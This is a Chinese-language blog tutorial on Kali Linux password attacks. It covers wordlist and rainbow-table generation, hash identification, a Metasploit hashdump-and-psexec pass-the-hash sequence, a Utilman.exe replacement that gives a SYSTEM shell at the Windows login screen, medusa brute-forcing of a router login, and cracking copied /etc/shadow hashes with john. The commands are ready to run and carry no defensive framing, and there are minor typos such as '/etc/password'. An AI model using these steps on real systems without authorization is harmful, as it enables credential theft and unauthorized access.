---
title: Kali-Linux常用密码攻击方法
date: 2024-01-13 20:28:36
tags: Kali
mathjax: true
---

# Kali-Linux常用密码攻击方法

## Stasprocessor

利用马尔可夫攻击方式分析已有的密码字典文件：

```bash
statsgen [options] passwords.txt
    #--version
    #-h,--help
    #-o password.marsks,--output=password.masks 保护掩码和统计信息到一个文件
    #--hiderare 隐藏比例<1%的统计项
    #--minlength=8 过滤最小长度为8的密码
    #--maxlength=8
    #--charset=loweralpha,numeric 指定过滤的密码字符
    #--simplemask=stringdigit,allspecial 过滤密掩码格式
```

例如分析rockyou.txt密码文件：

```bash
statsgen rockyou.txt
```

内容分别为：

1. 密码长度统计信息。

2. 密码字符集统计。

3. 密码复杂性统计。

4. 简单掩码统计。

5. 密码字符串掩码格式的高级统计。

掩码格式：

| 掩码格式 | 含义     |
| -------- | -------- |
| ?l       | a~z      |
| ?u       | A~Z      |
| ?d       | 0~9      |
| ?s       | 特殊字符 |

## Crunch

生成字典：

```bash
crunch <min> <max> [<charset string>][options]
    #<min> 生成密码的最小长度
    #<max>
    #<charset string> 指定的字符集
    #-o 指定生成的密码字典文件名
    #-b number[type] 指定写入文件最大字节数 可指定KB、MB或GB 必须与-o START一起使用
    #-t 设置使用特殊格式
    #-l 当-t指定@、%或^时 识别占位符的一些字符
```

该工具默认提供的字符集在/usr/share/crunch/charset.lst中。

例如：

```bash
crunch 8 10 hex-lower -o /root/crunch.txt
```

## rsmangler

基于用户收集的信息，利用常见密码构建规则来构建字典：

```bash
rsmangler -f wordlist.txt -o new_passwords.txt
```

例如当test文件内容如下时：

```
root
password
```

用该命令生成字典：

```bash
rsmangler -f test -o pass.txt
```

## rtgen

生成彩虹表，两种语法格式：

```bash
rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index
rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench
    #hash_algorithm 可指定的值有lm ntlm md5 sha1 sha256
    #charset 指定字符集
    #plaintext_len_min 指定生成的密码最小长度
    #plaintext_len_max
    #table_index 表单数量
    #chain_len 链长度
    #chain_num 链个数
    #part_index 块数量
```

默认提供的所有字符集在/usr/share/rainbowcrack/charset.txt中。

生成基于MD5的彩虹表，长度4~8：

```bash
rtgen md5 loweralpha 4 8 0 1000 1000 0
```

生成文件/usr/share/rainbowcrack/md5_loweralpha#4-8_0_1000x1000_0.rt，并使用rtsort进行排序：

```bash
rtsort md5_loweralpha#4-8_0_1000x1000_0.rt
```

## hashid

（hash-identifier比这个好用多了...

识别哈希密码值可能的加密方式：

```bash
hashid 哈希值
```

得到的结果中，排名越靠前，可能性越大。

## 直接使用哈希密码值

哈希爆不出来，就直接用哈希值绕过密码验证，使用MSF。

在Meterpreter会话中：

```
hashdump #获取哈希密码
backgroud
use exploit/windows/smb/psexec
show options
set RHOSTS 192.168.29.143
set SMBUser bob
set SMBPass 哈希值
exploit #成功打开一个Meterpreter会话
```

## Utilman

只试过Win7。

使用U盘进入Kali Linux的Live模式，打开Windows的磁盘，进入Windows/System32，将Utilman.exe替换为cmd.exe。重启Windows，在登录界面按Win+U，进入cmd，whoami显示为SYSTEM权限。

## Medusa

暴力密码破解，可FTP、HTTP、IMAP、MYSQL等，路由器管理界面基于HTTP协议，这里对路由器进行密码破解。

```bash
medusa -h [IP] -U [user file] -P [pass file] -M http -e ns
    #-h 指定目标主机地址
    #-u 指定尝试破解的用户名
    #-U 指定使用的用户名文件
    #-p 指定尝试破解的密码
    #-P 指定使用的密码文件
    #-M 指定要破解的模块类型
    #-e 尝试空密码
```

暴力破解路由器的登录用户名和密码：

```bash
medusa -h 192.168.1.1 -u admin -P password.txt -M http -e ns
```

## 破解Linux用户密码

```bash
cp /etc/password /etc/shadow /root/
unshadow passwd shadow > cracked
john --wordlist=/usr/share/john/password.lst cracked #破解密码
john --show cracked #查看破解后的密码和其他信息
```
